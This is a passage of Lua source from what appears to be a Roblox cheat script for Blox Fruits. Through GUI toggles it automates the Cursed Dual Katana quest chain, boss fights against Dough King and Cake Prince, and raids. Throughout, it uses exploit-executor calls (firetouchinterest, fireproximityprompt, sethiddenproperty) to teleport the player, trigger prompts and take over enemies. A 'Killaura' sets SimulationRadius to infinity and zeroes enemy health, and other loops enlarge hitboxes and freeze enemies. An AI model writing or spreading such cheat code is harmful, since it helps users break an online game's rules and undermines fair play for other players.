                if game.Workspace.Enemies:FindFirstChild("Cake Prince") then v = game.Workspace.Enemies:FindFirstChild("Cake Prince") end 
                if game.Workspace.Enemies:FindFirstChild("Dough King") then v = game.Workspace.Enemies:FindFirstChild("Dough King") end
                if ReplicatedStorage:FindFirstChild("Dough King") then v = ReplicatedStorage:FindFirstChild("Dough King") end
                if ReplicatedStorage:FindFirstChild("Cake Prince") then v = ReplicatedStorage:FindFirstChild("Cake Prince") end
                if getDistance(v.HumanoidRootPart.CFrame) > 3000 then
                    if not delta then
                        StopTween()
                        firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.CakeLoaf.BigMirror.Main, 0) 
                        firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.CakeLoaf.BigMirror.Main, 1) 
                        wait(1.5)
                    else
                        if getDistance(workspace.Map.CakeLoaf.BigMirror:GetPivot()) > 50 then
                            toPoint(workspace.Map.CakeLoaf.BigMirror:GetPivot())
                            wait(1.5)
                        else
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                        end
                    end
                end
            end
            
            

            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.KillDough and third_sea then
                            if game.Workspace.Enemies:FindFirstChild("Dough King") or game.Workspace.Enemies:FindFirstChild("Cake Prince") then
                                if game.Workspace.Enemies:FindFirstChild("Dough King") then v = game.Workspace.Enemies:FindFirstChild("Dough King") end 
                                if game.Workspace.Enemies:FindFirstChild("Cake Prince") then v = game.Workspace.Enemies:FindFirstChild("Cake Prince") end 
                                if v:FindFirstChild("HumanoidRootPart") then
                                    if v.Humanoid.Health <= 0 then 
                                        StopTween()
                                    else
                                        if StoppedTween then 
                                            StopTween()
                                            wait(.1)
                                            StoppedTween = false
                                        end
                                        repeat task.wait()
                                            EquipWeapon(_G.SelectWeapon)
                                            tpToDoughIfNeed()
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                            v.Humanoid:ChangeState(14)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Head.CanCollide = false
                                            BringMobFarm = false
                                            NameMon = v.Name
                                            PosMon = v.HumanoidRootPart.CFrame
                                        until not _G.KillDough or not v.Parent or v.Humanoid.Health <= 0 or not LP.Character:FindFirstChild("Humanoid") or LP.Character:FindFirstChild("Humanoid").Health <= 0
                                    end
                                else
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                end
                            elseif ReplicatedStorage:FindFirstChild("Dough King") or ReplicatedStorage:FindFirstChild("Cake Prince") then
                                tpToDoughIfNeed()
                            end
                        end
                    end)
                end
            end)
            
            function EquipSword(SwordName)
                if not LP.Character:FindFirstChild(SwordName) then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadItem",SwordName)
                end
            end
            function getGoodProgress()
                return ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil").Good
            end
            function getEvilProgress()
                return ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil").Evil
            end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["AutoCDK"] then
                            AutoCDK = true
                        else
                            AutoCDK = false
                        end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    st, err = pcall(function()
                        if AutoCDK then
                            if not game.Players.LocalPlayer.Neutral then
                                if _G.FarmingMastery == true then
                                    _G.FarmingMastery = false
                                    FarmBonesCDK = false
                                end
                                if not isWeaponInInventory("Cursed Dual Katana") then
                                    if GetMaterial("Alucard Fragment") < 6 and isWeaponInInventory("Yama") and isWeaponInInventory("Tushita") then
                                        if getWeaponMastery("Yama") < 350 then
                                            FarmBonesCDK = true
                                            EquipSword("Yama")
                                            _G.SelectWeapon = "Sword"
                                            _G.FarmingMastery = true
                                        elseif getWeaponMastery("Tushita") < 350 then
                                            FarmBonesCDK = true
                                            EquipSword("Tushita")
                                            _G.SelectWeapon = "Sword"
                                            _G.FarmingMastery = true
                                        else
                                            if getEvilProgress() ~= -2 and getEvilProgress() ~= 4 then
                                                if getEvilProgress() == 0 or getEvilProgress() == -3 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                                                    QuestYama1 = true
                                                    QuestYama2 = false
                                                    QuestYama3 = false
                                                    QuestTushita1 = false
                                                    QuestTushita2 = false
                                                    QuestTushita3 = false
                                                elseif getEvilProgress() == 1 or getEvilProgress() == -4 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                                                    QuestYama1 = false
                                                    QuestYama2 = true
                                                    QuestYama3 = false
                                                    QuestTushita1 = false
                                                    QuestTushita2 = false
                                                    QuestTushita3 = false
                                                elseif getEvilProgress() == 2 or getEvilProgress() == -5 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                                                    QuestYama1 = false
                                                    QuestYama2 = false
                                                    QuestYama3 = true
                                                    QuestTushita1 = false
                                                    QuestTushita2 = false
                                                    QuestTushita3 = false
                                                end
                                            elseif getGoodProgress() ~= -2 and getGoodProgress() ~= 3 then
                                                if getGoodProgress() == 0 or getGoodProgress() == -3 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                                                    QuestYama1 = false
                                                    QuestYama2 = false
                                                    QuestYama3 = false
                                                    QuestTushita1 = true
                                                    QuestTushita2 = false
                                                    QuestTushita3 = false
                                                elseif getGoodProgress() == 1 or getGoodProgress() == -4 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                                                    QuestYama1 = false
                                                    QuestYama2 = false
                                                    QuestYama3 = false
                                                    QuestTushita1 = false
                                                    QuestTushita2 = true
                                                    QuestTushita3 = false
                                                elseif getGoodProgress() == 2 or getGoodProgress() == -5 then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
                                                    QuestYama1 = false
                                                    QuestYama2 = false
                                                    QuestYama3 = false
                                                    QuestTushita1 = false
                                                    QuestTushita2 = false
                                                    QuestTushita3 = true
                                                end
                                            else
                                                QuestYama1 = false
                                                QuestYama2 = false
                                                QuestYama3 = false
                                                QuestTushita1 = false
                                                QuestTushita2 = false
                                                QuestTushita3 = false
                                            end
                                        end
                                    else
                                        if GetMaterial("Alucard Fragment") == 6 then
                                            QuestYama1 = false
                                            QuestYama2 = false
                                            QuestYama3 = false
                                            QuestTushita1 = false
                                            QuestTushita2 = false
                                            QuestTushita3 = false
                                            if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton Boss") then
                                                UnEquip()
                                                v = game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton Boss")
                                                toPoint(v.HumanoidRootPart.CFrame)
                                                if LP.Character.Humanoid.Health < LP.Character.Humanoid.MaxHealth - (LP.Character.Humanoid.MaxHealth / 100 * 20) then
                                                    LP.Character.Humanoid.Health = 0
                                                end
                                            else
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Good")
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
                                                if not workspace.Map.Turtle.Cursed.Pedestal3.ProximityPrompt.Enabled and not workspace.Map.Turtle.Cursed.Pedestal1.ProximityPrompt.Enabled and not workspace.Map.Turtle.Cursed.Pedestal2.ProximityPrompt.Enabled then
                                                    useNearestEntrance(CFrame.new(-12328.874, 610.103271, -6548.29932, -0.987361133, 4.54700206e-08, -0.15848659, 4.09048759e-08, 1, 3.20666658e-08, 0.15848659, 2.51785046e-08, -0.987361133))
                                                    followTarget(CFrame.new(-12328.874, 610.103271, -6548.29932, -0.987361133, 4.54700206e-08, -0.15848659, 4.09048759e-08, 1, 3.20666658e-08, 0.15848659, 2.51785046e-08, -0.987361133))
                                                    wait(1)
                                                    followTarget(CFrame.new(-12353.4648, 603.354797, -6550.20996, 0.0669946522, -4.77900137e-08, 0.997753322, -1.9794669e-08, 1, 4.92267489e-08, -0.997753322, -2.3048127e-08, 0.0669946522))
                                                end
                                                if workspace.Map.Turtle.Cursed.Pedestal1.ProximityPrompt.Enabled then 
                                                    repeat wait()
                                                        if useNearestEntrance(workspace.Map.Turtle.Cursed.Pedestal1.CFrame) then
                                                            StopTween()
                                                        end
                                                        toPoint(workspace.Map.Turtle.Cursed.Pedestal1.CFrame)
                                                    until getDistance(workspace.Map.Turtle.Cursed.Pedestal1.CFrame) < 30 or LP.Character.Humanoid.Health <= 0
                                                    fireproximityprompt(workspace.Map.Turtle.Cursed.Pedestal1.ProximityPrompt)
                                                end
                                                if workspace.Map.Turtle.Cursed.Pedestal3.ProximityPrompt.Enabled then 
                                                    repeat wait()
                                                        if useNearestEntrance(workspace.Map.Turtle.Cursed.Pedestal3.CFrame) then
                                                            StopTween()
                                                        end
                                                        toPoint(workspace.Map.Turtle.Cursed.Pedestal3.CFrame)
                                                    until getDistance(workspace.Map.Turtle.Cursed.Pedestal3.CFrame) < 30 or LP.Character.Humanoid.Health <= 0
                                                    fireproximityprompt(workspace.Map.Turtle.Cursed.Pedestal3.ProximityPrompt)
                                                    wait(1)
                                                    local VirtualUser=game:service'VirtualUser'
                                                    VirtualUser:CaptureController()
                                                    VirtualUser:ClickButton1(Vector2.new(300,300))
                                                end   
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","SpawnBoss")
                                            end
                                        end
                                    end
                                end
                            else
                                repeat wait() until not game.Players.LocalPlayer.Neutral and LP.Character:FindFirstChild("Humanoid") and LP.Character:FindFirstChild("HumanoidRootPart")
                            end
                        else
                            QuestYama1 = false
                            QuestYama2 = false
                            QuestYama3 = false
                            QuestTushita1 = false
                            QuestTushita2 = false
                            QuestTushita3 = false
                            FarmBonesCDK = false
                        end
                    end)
                    if err then print(err) end
                end
            end)
            
            spawn(function()
                while wait() do
                    if QuestYama1 then
                        st, er = pcall(function()
                            if (game:GetService("Workspace").Enemies:FindFirstChild("Mythological Pirate") or ReplicatedStorage:FindFirstChild("Mythological Pirate")) and LP.Character.Humanoid.Health > 0 then
                                v = game:GetService("Workspace").Enemies:FindFirstChild("Mythological Pirate") or ReplicatedStorage:FindFirstChild("Mythological Pirate")
                                toPoint(v.HumanoidRootPart.CFrame)
                                EquipSword("Yama")
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Evil")
                            else
                                toPoint(CFrame.new(-13451.46484375, 543.712890625, -6961.0029296875))
                            end
                        end)
                        if er then print(er) end
                    end
                end
            end)
        
            spawn(function()
                while wait() do
                    st, err = pcall(function()
                        if QuestYama2 then
                            target = nil
                            for i,v in pairs(LP.QuestHaze:GetChildren()) do
                                if v.Value > 0 then
                                    target = v
                                    break
                                end
                            end
                            if target then
                                if not game:GetService("Workspace").Enemies:FindFirstChild(target.Name) then
                                    if ReplicatedStorage:FindFirstChild(target.Name) then
                                        if useNearestEntrance(ReplicatedStorage:FindFirstChild(target.Name).HumanoidRootPart.CFrame) then
                                            StopTween()
                                        end
                                        toPoint(ReplicatedStorage:FindFirstChild(target.Name).HumanoidRootPart.CFrame)
                                    else
                                        for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                            if string.find(v.Name, target.Name) then
                                                if useNearestEntrance(v.CFrame * OffsetCFrame()) then
                                                    StopTween()
                                                end
                                                toPoint(v.CFrame * OffsetCFrame())
                                                break
                                            end
                                        end             
                                    end
                                else
                                    v = game:GetService("Workspace").Enemies:FindFirstChild(target.Name)
                                    repeat wait()
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = true
                                        PosMon = v.HumanoidRootPart.CFrame
                                        EquipSword("Yama")
                                        EquipWeapon("Sword")
                                        v.HumanoidRootPart.Transparency = 1
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until v.Humanoid.Health <= 0 or not v:FindFirstChild("HazeESP")
                                end
                            end
                        end
                    end)
                    if err then print(err) end
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if QuestYama3 and game:GetService("Workspace").Map:FindFirstChild("HellDimension") then
                            if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Hell's Messenger") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if getDistance(v.HumanoidRootPart.CFrame) < 1000 then
                                        if v.Name == "Cursed Skeleton" or v.Name == "Hell's Messenger" then
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Humanoid.Health = 0
                                            v.Head.CanCollide = false
                                            PosMon = game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame * CFrame.new(0,5,20)
                                            BringMobFarm = true
                                            v.HumanoidRootPart.Transparency = 1
                                        end
                                    end
                                end
                            end
                        end 
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    if QuestYama3 then
                        local s1, e1 = pcall(function()
                            if LP.Backpack:FindFirstChild("Hallow Essence") or LP.Character:FindFirstChild("Hallow Essence") then         
                                FarmBonesCDK = false  
                                -- if delta then
                                --     toTarget(workspace.Map["Haunted Castle"].Summoner.Detection.CFrame)
                                -- else
                                    if getDistance(CFrame.new(-9500.35352, 142.104813, 5868.80713, -0.999827981, 1.17699637e-08, -0.0185488295, 1.23603714e-08, 1, -3.17152917e-08, 0.0185488295, -3.19391056e-08, -0.999827981)) > 200 then
                                        toPoint(CFrame.new(-9500.35352, 142.104813, 5868.80713, -0.999827981, 1.17699637e-08, -0.0185488295, 1.23603714e-08, 1, -3.17152917e-08, 0.0185488295, -3.19391056e-08, -0.999827981))
                                    else
                                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 0)
                                        wait()
                                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 1)
                                    end
                                -- end
                            else
                                if (not game:GetService("Workspace").Map:FindFirstChild("HellDimension") or not game:GetService("Workspace").Map["HellDimension"]:FindFirstChild("Torch1")) or getDistance(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame) > 4000 then
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper") or game.ReplicatedStorage:FindFirstChild("Soul Reaper") then
                                        if not game:GetService("Workspace").Map:FindFirstChild("HellDimension") or getDistance(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame) > 4000 then
                                            if game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper") then
                                                sRip = game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper")
                                            elseif game.ReplicatedStorage:FindFirstChild("Soul Reaper") then
                                                sRip = game.ReplicatedStorage:FindFirstChild("Soul Reaper")
                                            end
                                            FarmBonesCDK = false
                                            toPoint(sRip.HumanoidRootPart.CFrame * CFrame.new(0,-1,0)) 
                                            UnEquip()
                                        end
                                    else
                                        if GetMaterial("Bones") > 500 then
                                            FarmBonesCDK = false
                                            WaitingEssence = true
                                            toPoint(CFrame.new(-9500.35352, 142.104813, 5868.80713, -0.999827981, 1.17699637e-08, -0.0185488295, 1.23603714e-08, 1, -3.17152917e-08, 0.0185488295, -3.19391056e-08, -0.999827981))
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones","Buy",1,1)
                                        else
                                            FarmBonesCDK = true
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones","Buy",1,1)
                                        end
                                    end
                                else
                                    FarmBonesCDK = false
                                    repeat wait()
                                        if getDistance(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame) < 4000 then
                                            if game:GetService("Workspace").Map["HellDimension"].Torch1.ProximityPrompt.Enabled then
                                                toPoint(game:GetService("Workspace").Map["HellDimension"].Torch1.CFrame)
                                                wait(1.5)
                                                fireproximityprompt(game:GetService("Workspace").Map["HellDimension"].Torch1.ProximityPrompt)
                                            elseif game:GetService("Workspace").Map["HellDimension"].Torch2.ProximityPrompt.Enabled then
                                                toPoint(game:GetService("Workspace").Map["HellDimension"].Torch2.CFrame)
                                                wait(1.5)
                                                fireproximityprompt(game:GetService("Workspace").Map["HellDimension"].Torch2.ProximityPrompt)
                                            elseif game:GetService("Workspace").Map["HellDimension"].Torch3.ProximityPrompt.Enabled then
                                                toPoint(game:GetService("Workspace").Map["HellDimension"].Torch3.CFrame)
                                                wait(1.5)
                                                fireproximityprompt(game:GetService("Workspace").Map["HellDimension"].Torch3.ProximityPrompt)  
                                            else
                                                toPoint(game:GetService("Workspace").Map["HellDimension"].Exit.CFrame * CFrame.new(20,0,0))
                                                wait(1.5)
                                                toPoint(game:GetService("Workspace").Map["HellDimension"].Exit.CFrame)
                                                wait(1.5)
                                            end
                                        end
                                    until not AutoCDK or not QuestYama3
                                end
                            end
                        end)
                        if e1 then print(e1) end
                    end
                end
            end)

            spawn(function() 
                while wait() do
                    if QuestTushita1 then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest","BoatQuest",workspace.NPCs:FindFirstChild("Luxury Boat Dealer"))
                    end
                end
            end)
        
            spawn(function()
                while wait() do
                    if QuestTushita1 then
                        repeat wait()
                            useNearestEntrance(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125))
                            toPoint(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125))
                        until getDistance(CFrame.new(-9546.990234375, 21.139892578125, 4686.1142578125)) < 20 or not AutoCDK or not QuestTushita1
                        wait(1)
                        repeat wait()
                            useNearestEntrance(CFrame.new(-6120.0576171875, 16.455780029296875, -2250.697265625))
                            toPoint(CFrame.new(-6120.0576171875, 16.455780029296875, -2250.697265625))
                        until getDistance(CFrame.new(-6120.0576171875, 16.455780029296875, -2250.697265625)) < 20 or not AutoCDK or not QuestTushita1
                        wait(1)
                        repeat wait()
                            useNearestEntrance(CFrame.new(-9533.2392578125, 7.254445552825928, -8372.69921875))
                            toPoint(CFrame.new(-9533.2392578125, 7.254445552825928, -8372.69921875))
                        until getDistance(CFrame.new(-9533.2392578125, 7.254445552825928, -8372.69921875)) < 20 or not AutoCDK or not QuestTushita1
                        wait(1)
                    end
                end
            end)
        
            spawn(function()
                while wait() do
                    if QuestTushita2 then
                        pcall(function()
                            RaidPos = CFrame.new(-5569.12939, 320.95163, -3037.64575, 0.887919843, -3.36478614e-08, 0.45999819, 5.15359346e-08, 1, -2.63303601e-08, -0.45999819, 4.70856847e-08, 0.887919843)
                            if getDistance(RaidPos) > 400 then
                                repeat wait()
                                    useNearestEntrance(RaidPos)
                                    toPoint(RaidPos)
                                until getDistance(RaidPos) < 20
                            end
                            BringMobFarm = false
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if getDistance(v.HumanoidRootPart.CFrame) < 1000 then
                                    repeat wait()
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        PosMon = v.HumanoidRootPart.CFrame
                                        EquipSword("Tushita")
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until v.Humanoid.Health <= 0 or not v.Parent or not AutoCDK or not QuestTushita2 or LP.Character.Humanoid.Health <= 0
                                end
                            end
                        end)
                    end
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if QuestTushita3 and game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension") then
                            if game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Heaven's Guardian") then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if getDistance(v.HumanoidRootPart.CFrame) < 1000 then
                                        if v.Name == "Cursed Skeleton" or v.Name == "Heaven's Guardian" then
                                            BringMobFarm = true
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Humanoid.Health = 0
                                            v.Head.CanCollide = false
                                            PosMon = game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.CFrame * CFrame.new(-20,0,20)
                                            v.HumanoidRootPart.Transparency = 1
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if QuestTushita3 then
                        pcall(function()
                            if not game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension") then
                                if (game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen") and game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen").Humanoid.Health > 0) or (game.ReplicatedStorage:FindFirstChild("Cake Queen") and game.ReplicatedStorage:FindFirstChild("Cake Queen").Humanoid.Health > 0) then
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen") then
                                        v = game:GetService("Workspace").Enemies:FindFirstChild("Cake Queen")
                                        repeat wait()
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = false
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipSword("Tushita")
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not AutoCDK or not QuestTushita3 or game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension") or v.Humanoid.Health <= 0 or not v.Parent or not LP.Character.Humanoid.Health <= 0
                                        StopTween()
                                        wait(2)
                                    else
                                        v = game.ReplicatedStorage:FindFirstChild("Cake Queen")
                                        toPoint(v * OffsetCFrame())
                                    end
                                else
                                    pos = CFrame.new(-715.122131, 399.923676, -11021.1973, 0.975071549, -7.006755e-08, -0.221890613, 7.95295918e-08, 1, 3.37080195e-08, 0.221890613, -5.05146041e-08, 0.975071549)
                                    if getDistance(pos) < 5000 then
                                        HopServer()
                                    else
                                        repeat wait()
                                            toPoint(pos)
                                        until getDistance(pos) < 20 or LP.Character.Humanoid.Health <= 0
                                    end
                                end
                            else
                                repeat wait()
                                    if getDistance(game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.CFrame) < 4000 then
                                        if game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.ProximityPrompt.Enabled then
                                            toPoint(game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.CFrame) 
                                            fireproximityprompt(game:GetService("Workspace").Map["HeavenlyDimension"].Torch1.ProximityPrompt)
                                            wait(1.5)
                                        elseif game:GetService("Workspace").Map["HeavenlyDimension"].Torch2.ProximityPrompt.Enabled then
                                            toPoint(game:GetService("Workspace").Map["HeavenlyDimension"].Torch2.CFrame) 
                                            fireproximityprompt(game:GetService("Workspace").Map["HeavenlyDimension"].Torch2.ProximityPrompt)  
                                            wait(1.5)
                                        elseif game:GetService("Workspace").Map["HeavenlyDimension"].Torch3.ProximityPrompt.Enabled then
                                            toPoint(game:GetService("Workspace").Map["HeavenlyDimension"].Torch3.CFrame) 
                                            fireproximityprompt(game:GetService("Workspace").Map["HeavenlyDimension"].Torch3.ProximityPrompt) 
                                            wait(1.5)   
                                        else
                                            toPoint(game:GetService("Workspace").Map["HeavenlyDimension"].Exit.CFrame)
                                            wait()
                                            toPoint(game:GetService("Workspace").Map["HeavenlyDimension"].Exit.CFrame * CFrame.new(10,0,0))
                                        end
                                    end
                                until not AutoCDK or not QuestTushita3 or GetMaterial("Alucard Fragment") == 6
                            end
                        end)
                    end
                end
            end)


        end
        
        local RaidTab = Window:NewTab("Raid")
        local RaidSection = RaidTab:NewSection("Raid")
       
        -- killaura
        SelectedChip = "Flame"
        KillauraRadius = 700
        Killaura = RaidSection:NewToggle("Killaura [ONLY WHILE RAID]", function(state)
            getgenv().EuphoriaSettings["killaura"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["killaura"] then Killaura:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["killaura"] and not BlockRaids then
                        if LP.PlayerGui.Main.Timer.Visible == true then
                            for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and LP.Character:FindFirstChild("HumanoidRootPart") and (LP.Character.HumanoidRootPart.CFrame.Position - v.HumanoidRootPart.CFrame.Position).Magnitude < KillauraRadius then
                                    pcall(function()
                                        repeat task.wait()
                                            sethiddenproperty(LP, "SimulationRadius", math.huge)
                                            BringMobFarm = false
                                            PosMon = v.HumanoidRootPart.CFrame
                                            v.Humanoid.Health = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            v.HumanoidRootPart.Size = Vector3.new(100,100,100)
                                            v.HumanoidRootPart.Transparency = 0.95
                                        until not getgenv().EuphoriaSettings["killaura"] or not v.Parent or v.Humanoid.Health <= 0 or not LP.Character:FindFirstChild("HumanoidRootPart") or (LP.Character.HumanoidRootPart.CFrame.Position - v.HumanoidRootPart.CFrame.Position).Magnitude > KillauraRadius
                                    end)
                                end
                            end
                        end
                    end
                end)
            end
        end)
        autonextisland = RaidSection:NewToggle("Auto Next Island [ONLY WHILE RAID]", function(state)
            getgenv().EuphoriaSettings["autonextisland"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["autonextisland"] and not BlockRaids then autonextisland:UpdateToggle(nil, true) end
        function isIslandNearest()
            islands = {"Island 5", "Island 4", "Island 3", "Island 2", "Island 1"}
            for i,islandName in pairs(islands) do
                for i,v in pairs(game.Workspace._WorldOrigin.Locations:GetChildren()) do
                    if v.Name == islandName then
                        if (LP.Character.HumanoidRootPart.Position - v.Position).Magnitude <= 5000 then
                            return true
                        end
                    end
                end
            end
            return false
        end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["autonextisland"] then
                        islands = {"Island 5", "Island 4", "Island 3", "Island 2", "Island 1"}
                        if LP.PlayerGui.Main.Timer.Visible == true then
                            NoClip = true
                            found = false
                            for i,islandName in pairs(islands) do
                                for i,v in pairs(game.Workspace._WorldOrigin.Locations:GetChildren()) do
                                    if v.Name == islandName then
                                        if (LP.Character.HumanoidRootPart.Position - v.Position).Magnitude <= 5000 then
                                            toPoint(CFrame.new(v.CFrame.X, 45, v.CFrame.Z))
                                            found = true
                                            break
                                        end
                                    end
                                end
                                if found then break end
                            end
                        else
                            NoClip = false
                        end
                    else
                        NoClip = false
                    end
                end)
            end
        end)
        autostartraid = RaidSection:NewToggle("Auto Start Raid", function(state)
            getgenv().EuphoriaSettings["autostartraid"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["autostartraid"] then autostartraid:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["autostartraid"] and not BlockRaids then
                        curFrag = LP.Data.Fragments.Value
                        if LP.PlayerGui.Main.Timer.Visible or isIslandNearest() then curFrag = curFrag + 1000 end
                        if not getgenv().EuphoriaSettings["enabledmaxfrag"] or curFrag < getgenv().EuphoriaSettings["maxfrag"] then
                            if LP.Backpack:FindFirstChild("Special Microchip") and not isIslandNearest() then
                                if second_sea then
                                    buttonPos = Vector3.new(-6488.0185546875, 248.6365203857422, -4527.62158203125)
                                    for i, child in pairs(game:GetService("Workspace").Map.CircleIsland:GetChildren()) do
                                        if child.Name == "RaidSummon2" then
                                            if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                                                fireclickdetector(child.Button.Main.ClickDetector) 
                                            end
                                        end
                                    end
                                end
                                if third_sea then
                                    buttonPos = Vector3.new(-5006.56641, 322.691223, -2983.73389)
                                    for i, child in pairs(game:GetService("Workspace").Map["Boat Castle"]:GetChildren()) do
                                        if child.Name == "RaidSummon2" then
                                            if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                                                fireclickdetector(child.Button.Main.ClickDetector) 
                                            end
                                        end
                                    end
                                end
                                task.wait(10)
                            end
                        end
                    end
                end)
            end
        end)
        autobuychip = RaidSection:NewToggle("Auto Buy Chip", function(state)
            getgenv().EuphoriaSettings["autobuychip"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["autobuychip"] then autobuychip:UpdateToggle(nil, true) end
        FakeFruit = false
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["autobuychip"] and not BlockRaids and not LP.PlayerGui.Main.Timer.Visible and not isIslandNearest() then
                        if isItemInEquip("Special Microchip") then curFrag = curFrag + 1000 end
                        if LP.PlayerGui.Main.Timer.Visible or isIslandNearest() then curFrag = curFrag + 1000 end
                        if not getgenv().EuphoriaSettings["enabledmaxfrag"] or curFrag < getgenv().EuphoriaSettings["maxfrag"] then
                            task.wait(2)
                            if getgenv().EuphoriaSettings["autobuychip"] then
